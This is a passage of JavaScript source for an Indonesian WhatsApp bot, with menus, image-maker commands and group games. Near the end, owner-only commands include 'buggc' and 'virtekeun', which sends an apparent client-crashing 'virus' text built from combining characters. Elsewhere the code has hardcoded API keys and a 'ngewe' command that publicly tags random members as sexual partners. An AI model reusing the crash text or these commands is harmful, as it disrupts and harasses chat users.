â€¢ ${prefix}join
â€¢ ${prefix}caripesan <query>
â€¢ ${prefix}get
â€¢ ${prefix}ytsearch <query>
â€¢ ${prefix}igstalk <query>
â€¢ ${prefix}githubstalk <query>
â€¢ ${prefix}tiktokstalk <query>
â€¢ ${prefix}play <query>
â€¢ ${prefix}video <query>
â€¢ ${prefix}igstory <username>
â€¢ ${prefix}twitter <link>
â€¢ ${prefix}tiktok <link>
â€¢ ${prefix}tiktokaudio <link>
â€¢ ${prefix}fb <link>
â€¢ ${prefix}brainly <query>
â€¢ ${prefix}image <query>
â€¢ ${prefix}anime <random>
â€¢ ${prefix}pinterest <query>
â€¢ ${prefix}komiku <query>
â€¢ ${prefix}lirik <query>
â€¢ ${prefix}chara <query>
â€¢ ${prefix}playstore <query>
â€¢ ${prefix}otaku <query>` })
					break
case "stcmd":
					// Fix Case by Putra
					sya = await getBuffer(`https://telegra.ph/file/381f48dc7fcdd20f78edd.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*STICKER CMD*
â€¢ ${prefix}addcmd
â€¢ ${prefix}delcmd
â€¢ ${prefix}listcmd` })
					break
case "makerc":
					// Fix Case by Putra
					sya = await getBuffer(`https://telegra.ph/file/f6fbcdcc7be434f22ee49.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*MAKER CONVERT*
â€¢ ${prefix}spongebobm _ReplyGambar_
â€¢ ${prefix}hengkerm _ReplyGambar_
â€¢ ${prefix}hengkerm2 _ReplyGambar_
â€¢ ${prefix}ripm _ReplyGambar_
â€¢ ${prefix}stonkm _ReplyGambar_
â€¢ ${prefix}notstonkm _ReplyGambar_
â€¢ ${prefix}patrickm _ReplyGambar_` })
					break
case "stcmenu":
					// Fix Case by Putra
					sya = await getBuffer(`https://telegra.ph/file/532f14b3580e28d636705.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*STICKER CONVERT*
â€¢ ${prefix}bajingan lu _Text_
â€¢ ${prefix}sticker
â€¢ ${prefix}gay
â€¢ ${prefix}take Author|Pack
â€¢ ${prefix}swm Author|Pack
â€¢ ${prefix}attp _Text_
â€¢ ${prefix}ttp _Text_
â€¢ ${prefix}ttpblue _Text_
â€¢ ${prefix}ttpyellow _Text_
â€¢ ${prefix}ttpgreen _Text_` })
					break
case "imagemenu":
					// Fix Case by Putra
					sya = await getBuffer(`https://telegra.ph/file/9a9d57dfe3aed1c9df709.jpg`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*RANDOM IMAGE*
â€¢ ${prefix}neko
â€¢ ${prefix}blowjob
â€¢ ${prefix}cecan
â€¢ ${prefix}cogan
â€¢ ${prefix}quotes
â€¢ ${prefix}kucing
â€¢ ${prefix}squidward
â€¢ ${prefix}spongebob
â€¢ ${prefix}patrick
â€¢ ${prefix}minato
â€¢ ${prefix}kakashi
â€¢ ${prefix}boruto
â€¢ ${prefix}sarada
â€¢ ${prefix}mitsuki
â€¢ ${prefix}sasuke
â€¢ ${prefix}sakura
â€¢ ${prefix}itachi
â€¢ ${prefix}megumin
â€¢ ${prefix}loli
â€¢ ${prefix}husbu
â€¢ ${prefix}wafiu
â€¢ ${prefix}wallpaperanime
â€¢ ${prefix}naruto
â€¢ ${prefix}aeshtetic` })
					break
case "votemenu":
					// Fix Case by Putra
					sya = await getBuffer(`https://telegra.ph/file/3357c40ff7cdded3dbc7d.png`)
					syaa.sendMessage(from, sya,  image, { quoted: mek, caption: `*VOTE*
â€¢ ${prefix}voting
â€¢ ${prefix}delvote
 vote
 devote` })
					break
//Akhirrr
case "peraturan2":
					// Fix Case by Putra
					sya = await getBuffer(`https://telegra.ph/file/2df02fc7ecebd2ebd6a69.jpg`)
					syaa.sendMessage(from, sya, image, { quoted: mek, caption: `KATASHI Bot merupakan suatu program bot whatsapp, yang menggunakan engine nodejs v14.x.x
Adapun ketentuan untuk memakai KATASHI Bot. :
*1.* Pengguna dapat menggunakan semua perintah/command dengan tanpa adanya limit yg tersedia.
*2.* Bot akan di reset oleh owner satu kali 24 jam
*3.* Bot dapat memblokir pengguna/user melanggar rules yang ada di bot ini, rules yang harus dipatuhi oleh pengguna antara lain :
  â€¢ Tidak melakukan panggilan telepon/video call terhadap Bot
  â€¢ Tidak melakukan spam perintah/command yang ada dalam bot ini
*4.* Dilarang keras mengirim pesan V dan semacamnya yang membuat server down ataupun bot crash
*5.* Pengguna yang mengirim hal atau data pribadi tidak akan disimpan oleh bot ini, dan tidak akan bertanggung jawab atas data pribadi tersebut!

_Note : Bot ini menggunakan autoread atau langsung membaca pesan yang pengguna kirim_

Regards : Katashi
Owner  Bot:
wa.me/6289626029135
` })
					break
case "maker1":
                                  
                if (args.length < 1) return reply(`Teksnya mana ngab?\nContoh ${prefix}nulis Sya`)
if (args.length < 1) return reply(`mau tulis apa um?`)
reply('Bentar')
burik = body.slice(8)
anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/maker3d?text=${burik}apikey=Alphabot`)
buffer = await getBuffer(anu.result)
syaa.sendMessage(from, buffer, image, { quoted: mek, caption: 'Nah dah selesai, tulisan gw gimana?bagus gak?'})
break
case "gogle":
                const googleQuery = body.slice(6)
               
                if(googleQuery == undefined || googleQuery == ' ') return reply(`*Hasil Pencarian : ${googleQuery}* tidak ditemukan`)
                google({ 'query': googleQuery }).then(results => {
                let vars = `_*Hasil Pencarian : ${googleQuery}*_\n`
                for (let i = 0; i < results.length; i++) {
                    vars +=  `\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n*Judul* : ${results[i].title}\n\n*Deskripsi* : ${results[i].snippet}\n\n*Link* : ${results[i].link}\n\n`
                }
                    reply(vars)
                }).catch(e => {
                    console.log(e)
                    syaa.sendMessage(from, 'Google Error : ' + e);
                })
                break 
case "tebakgambar":
					  
   anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/kuis/tebakgambar?apikey=beta`)
   gambar = await getBuffer(anu.result.images)
   setTimeout( () => {
   reply('*âž¸ Jawaban :* '+anu.result.jawaban, text, {quoted: mek}) // ur cods
   }, 60000) // 1000 = 1s,
   setTimeout( () => {
   reply('_10 Detik lagiâ€¦_', text) // ur cods
   }, 30000) // 1000 = 1s,
   setTimeout( () => {
   reply('_30 Detik lagi_â€¦', text) // ur cods
   }, 10000) // 1000 = 1s,
   setTimeout( () => {
   reply('_60 Detik lagi_â€¦', text) // ur cods
   }, 2500) // 1000 = 1s,
   setTimeout( () => {
   syaa.sendMessage(from, gambar, image, {quoted: mek }) // ur cods
   }, 0) // 1000 = 1s,
   break
case "lesbicek":
					// âš ï¸ Case by DappaUhuy&YogPw
                 
                 
					lesbii = body.slice(1)
					const lesbi =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const bi = lesbi[Math.floor(Math.random() * lesbi.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+lesbii+'*\n\nJawaban : '+ bi+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
                    case "gantengcek":
					// âš ï¸ Case by DappaUhuy&YogPw

                 
					ganteng = body.slice(1)
					const gan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+ganteng+'*\n\nJawaban : '+ teng+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "cantikcek":
					// âš ï¸ Case by DappaUhuy&YogPw

                 
					cantik = body.slice(1)
					const can =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+cantik+'*\n\nJawaban : '+ tik+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
		            case "watak":
					// âš ï¸ Case by DappaUhuy&YogPw

                 
					watak = body.slice(1)
					const wa =['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
					const tak = wa[Math.floor(Math.random() * wa.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak, text, { quoted: mek })
					await limitAdd(sender)
				        break
		         case "hobby":
					// âš ï¸ Case by DappaUhuy&YogPw

                 
					hobby = body.slice(1)
					const hob =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
					const by = hob[Math.floor(Math.random() * hob.length)]
					syaa.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, { quoted: mek })
					await limitAdd(sender)
					break
                case "jadian":
				
					jds = []
					const jdii = groupMembers
					const koss = groupMembers
					const akuu = jdii[Math.floor(Math.random() * jdii.length)]
					const diaa = koss[Math.floor(Math.random() * koss.length)]
					teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]} â™¥ï¸ @${diaa.jid.split('@')[0]} `
					jds.push(akuu.jid)
					jds.push(diaa.jid)
					mentions(teks, jds, true)
					await limitAdd(sender)
					break	
          case "ngewe":
				
			
					jds = []
					const jdiid = groupMembers
					const kosst = groupMembers
					const akuut = jdiid[Math.floor(Math.random() * jdiid.length)]
					const diaat = kosst[Math.floor(Math.random() * kosst.length)]
					teks = `Yang ngewe kemarin di grub ini adalah @${akuut.jid.split('@')[0]} danï¸ @${diaat.jid.split('@')[0]} `
					jds.push(akuut.jid)
					jds.push(diaat.jid)
					mentions(teks, jds, true)
					await limitAdd(sender)
					break	
               case "terganteng":
				
				
					jds = []
					const jdiidc = groupMembers
					const kosstc = groupMembers
					const akuutc = jdiidc[Math.floor(Math.random() * jdiidc.length)]
					teks = `Yang terganteng di grub ini adalah @${akuutc.jid.split('@')[0]}`
					jds.push(akuutc.jid)
					mentions(teks, jds, true)
					await limitAdd(sender)
					break	
               case "tercantik":
				
				
					jds = []
					const jdiidr = groupMembers
					const kosstr = groupMembers
					const akuutr = jdiidr[Math.floor(Math.random() * jdiidr.length)]
					teks = `Yang tercantik di grub ini adalah @${akuutr.jid.split('@')[0]}`
					jds.push(akuutr.jid)
					mentions(teks, jds, true)
					await limitAdd(sender)
					break	
					case "googlem":
					  
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}googlemaker Tolol|Test|Anjay`)
				reply('Bentar lagi di proses')
kontol = body.slice(8)
memek3 = kontol.split("|")[0];
memek4 = kontol.split("|")[1];
memek5 = kontol.split("|")[2];
anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker?text=${memek3}&text2=${memek4}&text3=${memek5}&theme=google-suggestion&apikey=beta`)
buffer = await getBuffer(anu.result.url)
buffer1 = await getBuffer(anu.result.delete_url)
shit = `${anu.result.url}\n${anu.result.info}`
syaa.sendMessage(from, buffer, image, {quoted: mek, caption: shit})
break
case "textburn":
					  
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}googlemaker ${prefix}textburn arasya`)
				reply('Bentar lagi di proses')
kontol = body.slice(10)
anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker/random?text=${kontol}&theme=text-burn&apikey=Alphabot`)
buffer = await getBuffer(anu.result.url)
buffer1 = await getBuffer(anu.result.delete_url)
shit = `${anu.result.url}\n${anu.result.info}`
syaa.sendMessage(from, buffer, image, {quoted: mek, caption: shit})
break
case "quote":
					  
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}googlemaker ${prefix}quote arasya`)
				reply('Bentar lagi di proses')
kontol = body.slice(7)
anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker/random?text=${kontol}&theme=art-quote&apikey=Alphabot`)
buffer = await getBuffer(anu.result.url)
buffer1 = await getBuffer(anu.result.delete_url)
shit = `${anu.result.url}\n${anu.result.info}`
syaa.sendMessage(from, buffer, image, {quoted: mek, caption: shit})
break
case "wooden":
					  
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}googlemaker ${prefix}wooden arasya`)
				reply('Bentar lagi di proses')
kontol = body.slice(8)
anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker/roses?text=${kontol}&theme=wooden-boarch&apikey=Alphabot`)
buffer = await getBuffer(anu.result.url)
buffer1 = await getBuffer(anu.result.delete_url)
shit = `${anu.result.url}\n${anu.result.info}`
syaa.sendMessage(from, buffer, image, {quoted: mek, caption: shit})
break
case "roses":
					  
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}googlemaker ${prefix}roses arasya`)
				reply('Bentar lagi di proses')
kontol = body.slice(7)
anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker/roses?text=${kontol}&theme=golden&apikey=Alphabot`)
buffer = await getBuffer(anu.result.url)
buffer1 = await getBuffer(anu.result.delete_url)
shit = `${anu.result.url}\n${anu.result.info}`
syaa.sendMessage(from, buffer, image, {quoted: mek, caption: shit})
break
case "neon":
					  
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}googlemaker Tolol|Test|Anjay`)
				reply('Bentar lagi di proses')
SyaGanz = body.slice(6)
anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker/metallic?text=${SyaGanz}&theme=neon&apikey=beta`)
shit = `Test`
syaa.sendMessage(from, image, {quoted: mek, caption: shit})
break
case "naruto2":
					  
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix + command} Arasya Ganteng`)
				reply('Bentar lagi di proses')
indobgt = body.slice(7)
anu = await fetchJson(`https://api.zeks.me/api/naruto?apikey=Iyungputra&text=${indobgt}`)
shit = `Test`
syaa.sendMessage(from, image, {quoted: mek, caption: shit})
break
case "maker3d":
					  
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}googlemaker Tolol|Test|Anjay`)
				reply('Bentar lagi di proses')
kentod = body.slice(9)
anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/maker3d/no4?text=${kentod}&apikey=beta`)
shit = `Test`
syaa.sendMessage(from, image, {quoted: mek, caption: shit})
break
case 'cuaca1': // pikirin sendiri lah tot,cape gw ngerjain sc kontol sampe malem malem,kena marah ortu bangsat

                if (args.length < 1) return reply(`Masukan nama daerah`)
                reply(`[â•] Loading`)
                asu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/infocuaca?provinsi=${args[0]}&apikey=beta`)
                teks = '=================\n'
                lala = `${asu.result.result}`
                for (let i of lala) {
                teks += `â€¢ *Title*: ${i.title}\nâ€¢ *Kota*: ${i.nama_kota}\nâ€¢ *Cuaca Malam* : ${i.cuaca_malam}\nâ€¢ *Cuaca dini hari* : ${i.cuaca_dini_hari}\nâ€¢ *Suhu* : ${i.suhu}\n=================\n`
                }
                ikkeh_kimochi_ahhh = await getBuffer(`https://i.postimg.cc/hvHsThsH/images-17.jpg`)
                syaa.sendMessage(from, ikkeh_kimochi_ahhh, image, {quoted: mek, caption: teks})
                break
case "pubglogo":
       
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}pubglogo Arasya|Ganz`)
				reply('Sebentar lagi di buat')
     ct = body.slice(9)
     memek1 = ct.split("|")[0];
     memek2 = ct.split("|")[1];
     anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/textmaker/game?text=${memek1}&text2=${memek2}&theme=pubg&apikey=beta`)
     buffer = await getBuffer(anu.result.url)
     syaa.sendMessage(from, buffer, image, {quoted: mek, caption: 'nih kack'})
     break
case 'mediafire': //By Arga
				reply(mess.wait)
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/mediafiredl?url=${args[0]}/file&apikey=Ikyy69`, {method: 'get'})
buffer = await getBuffer(anu.download)
teks = `Nama File : ${anu.title}
Creator : ${anu.creator}
File Size : ${anu.fileSize}
Tanggal Upload : ${anu.uploadAt}
Link Download : ${anu.urlDown}`
syaa.sendMessage(from, teks, text, {quoted: mek})
costum(buffer, MessageType.document)
break
case "waifum":
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix + command}Arasya|Ganz`)
				reply(mess.wait)
     ct = body.slice(8)
     memek1 = ct.split("|")[0];
     memek2 = ct.split("|")[1];
     anu = await fetchJson(`https://hardianto-chan.herokuapp.com/api/bot/gfx4?apikey=hardianto&text1=${memek1}&text2=${memek2}`)
     buffer = await getBuffer(anu.result.url)
     syaa.sendMessage(from, buffer, image, {quoted: mek, caption: 'nih kack'})
     break
case "ctahta":
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}ctahta Arasya|Ganteng|`)
				reply('Sebentar lagi di buat')
     ct = body.slice(9)
     memek1 = ct.split("|")[0];
     memek2 = ct.split("|")[1];
     memek3 = ct.split("|")[2];
     anu = await fetchJson(`https://hardianto-chan.herokuapp.com/api/customtahta?query=${memek1}\n${memek2}\n${memek3}&apikey=hardianto`)
     buffer = await getBuffer(anu.result.url)
     syaa.sendMessage(from, buffer, image, {quoted: mek, caption: 'nih kack'})
     break
case 'memegenerator':
    case 'memegen':
   if (isBanned) return reply(mess.ban)
   if (!isPremium && !mek.key.fromMe) return reply(mess.prem)
   if (args.length < 1) return reply(`Kirim perintah *${prefix + command}* teks atas|teks bawah`)
   if (!q.includes('|')) return reply(`Kirim perintah *${prefix + command}* teks atas|teks bawah`)
   try {
   if (!isQuotedImage && !isQuotedSticker) return reply(`REPLY GAMBAR ATAU STICKER!!`)
   reply(mess.wait)
   var teks1 = q.split('|')[0] ? q.split('|')[0] : ''
   var teks2 = q.split('|')[1] ? q.split('|')[1] : ''
   var imgbb = require('imgbb-uploader')
   var enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
   var media = await syaa.downloadAndSaveMediaMessage(enmedia)
   var njay = await imgbb('520bd6f6209077d1777c2a4f20c509c2', media)
   var resu = await getBuffer(`https://api.memegen.link/images/custom/${teks1}/${teks2}.png?background=${njay.display_url}`)
   syaa.sendMessage(from, resu, image, {quoted: mek})
    fs.unlinkSync(media)
    } catch (e) {
    return reply(`${e}`)
    console.log(e)
    }
   break
/*case 'pornhub':
                
                case 'avenger':
                case 'space':
                case 'ninjalogo':
                case 'marvelstudio':
                case 'lionlogo':
                case 'wolflogo':
                case 'steel3d':
                case 'wallgravity':
                
				reply("Loading.....")
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    txt1 = args[0]
                    txt2 = args[1]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=pemburuBansos&text1=${txt1}&text2=${txt2}`)
                    syaa.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break*/
case "harta":
                
				reply("Loading.....")
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    txt1 = args[0]
                    txt2 = args[1]
                    ini_buffer = await getBuffer(`https://bx-hunter.herokuapp.com/api/chartatahta?text=${txt1}&apikey=Ikyy69`)
                    syaa.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break
case 'tahta':
				if (isBanned) return reply(mess.ban)
				dapuhy = body.slice(7)
				reply("loading.....")
				asu = await getBuffer(`https://api.zeks.xyz/api/hartatahta?text=${dapuhy}&apikey=Iyungputra`)
				syaa.sendMessage(from, asu, image, {quoted: mek})
				break
case "hartatahta":
         if (args.length == 0) return reply(`Usage: ${prefix} + command} text\nExample: ${prefix + command} DHA`) 
         teks = args.join(" ") 
         reply('SABAR YA SAYANG....') 
         buffer = await getBuffer(`https://api.lolhuman.xyz/api/hartatahta?apikey=pemburuBansos&text=${teks}`) 
         syaa.sendMessage(from, buffer, image, {quoted: mek, caption : 'ini hasilnya kak....'})
         break   
case "pppppp":
				if (args.length < 1) return reply(`Textnya Mana Cuy?\n*Contoh ${prefix}glitch Arasya|Ganz`)
				reply('Sebentar lagi di buat')
     ct = body.slice(8)
     memek1 = ct.split("|")[0];
     memek2 = ct.split("|")[1];
     anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/photooxy/glitch?text1=${memek1}&text2=${memek2}&apikey=Ikyy69`)
     buffer = await getBuffer(anu.result.url)
     syaa.sendMessage(from, buffer, image, {quoted: mek, caption: 'nih kack'})
     break
case "caklontong":
  if (isBanned) return reply(mess.ban)
   anu = await fetchJson(`https://rest-api-megumin1.herokuapp.com/api/kuis/caklontong?apikey=beta`)
   cak = `*${anu.result.soal}*`
   setTimeout( () => {
   reply('*âž¸ Jawaban :* '+anu.result.jawaban, text, {quoted: mek}) // ur cods
   }, 30000) // 1000 = 1s,
   setTimeout( () => {
   reply('_10 Detik lagiâ€¦_', text) // ur cods
   }, 20000) // 1000 = 1s,
   setTimeout( () => {
   reply('_20 Detik lagi_â€¦', text) // ur cods
   }, 10000) // 1000 = 1s,
   setTimeout( () => {
   reply('_30 Detik lagi_â€¦', text) // ur cods
   }, 2500) // 1000 = 1s,
   setTimeout( () => {
   syaa.sendMessage(from, cak, text, {quoted: mek }) // ur cods
   }, 0) // 1000 = 1s,
   break
      //------------------< Fitur Anti antian >-------------------
      case "antilink":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (args[0] == "on") {
          if (isAntilink) return reply("Sudah aktif!!");
          antilink.push(from);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mengaktifkan antilink!");
        } else if (args[0] == "off") {
          antilink.splice(from, 1);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mematikan antilink!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTILINK`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antilink on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antilink off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "antihidetag":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntihidetag) return reply("Sudah aktif!!");
          antihidetg.push(from);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mengaktifkan antihidetag!");
        } else if (args[0] == "off") {
          antihidetg.splice(from, 1);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mematikan antihidetag!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIHIDETAG`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antihidetag on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antihidetag off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
      case "antiviewonce":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntiviewonce) return reply("Sudah aktif!!");
          antivo.push(from);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mengaktifkan antiviewonce!");
        } else if (args[0] == "off") {
          antivo.splice(from, 1);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mematikan antiviewonce!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIVIEWONCE`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antiviewonce on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antiviewonce off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
        
case 'asupan':
  if (isBanned) return reply(mess.ban)
  if (!isPremium) return reply(mess.prem)
  
			syaa.updatePresence(from, Presence.composing) 
				reply(mess.wait)
				data = fs.readFileSync('./lib/asupan.js');
				jsonData = JSON.parse(data);
				randIndex = Math.floor(Math.random() * jsonData.length);
				randKey = jsonData[randIndex];
				asupan = await getBuffer(randKey.result)
				syaa.sendMessage(from, asupan, video, {quoted: mek, caption: '```ASUPAN NIH:V```'})
				break        
case 'asupan2':
			syaa.updatePresence(from, Presence.composing) 
				reply(mess.wait)
				data = fs.readFileSync('./lib/asupan2.js');
				jsonData = JSON.parse(data);
				randIndex = Math.floor(Math.random() * jsonData.length);
				randKey = jsonData[randIndex];
				asupan = await getBuffer(randKey.result)
				syaa.sendMessage(from, asupan, video, {quoted: mek, caption: '```ASUPAN NIH:V```'})
				break
        
case 'buggc':
if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
await syaa.toggleDisappearingMessages(from)
text = 'Mampus!!'
syaa.sendMessages(from, text, text, {quoted: mek})
break
///ð‘ƒð¼ð‘…ð‘‡ð¸ð¾
 case "virtekeun":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)    
   reply(`ðŸ‡®ðŸ‡®ðŸ‡©âƒ¢âƒžâƒ     ðŸ‡®ðŸ‡©âƒ¢âƒžâƒÛÌ¶ *VIRUS ðŸ‡®ðŸ‡©âƒ¢âƒžâƒÛÌ¶ EROR SYSTEMÛâƒ¢âƒžÌ¶*Ûâƒ¢âƒžÌ¶ðŸ‡®ðŸ‡©
ðŸ‡®ðŸ‡©âƒ¢âƒžâƒÛÌ¶ *EROR SYSTEM*Ûâƒ¢âƒžÌ¶ðŸ‡®ðŸ‡©
ðŸ‡®ðŸ‡©âƒ¢âƒžâƒÛÌ¶ *EROR System'*Ûâƒ¢âƒžÌ¶ðŸ‡®ðŸ‡©
*9999999* *à¸œà¸´à¸”à¸¸à¸—à¹‰à¹ˆâ€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š â€Šâ€‰â€Šâ€‰â€Šâ€‰â€Š 